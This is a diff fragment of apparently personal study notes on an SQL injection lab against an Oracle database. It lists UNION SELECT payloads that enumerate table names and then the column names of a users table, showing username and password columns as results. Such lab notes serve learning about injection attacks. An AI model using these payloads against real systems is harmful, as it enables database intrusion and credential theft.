@@ -115,3 +115,6 @@ ANS : GET /filter?category=Gifts'--+
 
       'union SELECT table_name,'ABC' FROM user_tables --+  : USERS_BYFICP ,PRODUCTS
 
+     -Find colums name from Oracle DB  tables
+
+      'union SELECT column_name,'ABC' FROM   all_tab_columns WHERE  table_name = 'USERS_BYFICP' --+ : USERNAME_SLTNDT ,PASSWORD_KWSPKR 
